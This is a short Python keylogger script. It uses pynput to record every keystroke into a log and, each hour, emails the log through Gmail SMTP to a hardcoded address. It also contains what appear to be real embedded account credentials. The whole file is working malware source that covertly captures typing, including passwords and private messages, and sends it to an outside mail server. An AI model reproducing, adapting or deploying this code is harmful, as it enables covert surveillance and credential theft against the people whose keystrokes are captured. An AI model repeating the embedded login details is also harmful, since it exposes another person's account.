import pynput.keyboard
import threading
import smtplib
log = ""

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email, password,)
    server.sendmail(email, email, message)
    server.quit()

def process_key_press(key):
	global log
	try:
		log = log + str(key.char)
	except AttributeError:
		if key == key.space:
			log = log + " "
		else:
			log = log + " " + str(key) + " "
	#print(log)

def report():
	global log
	send_mail("meherpranav5@gmail.com", "dontaskagain", log)
	log = ""
	timer = threading.Timer(3600, report)
	timer.start()


keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
	report()
	keyboard_listener.join()
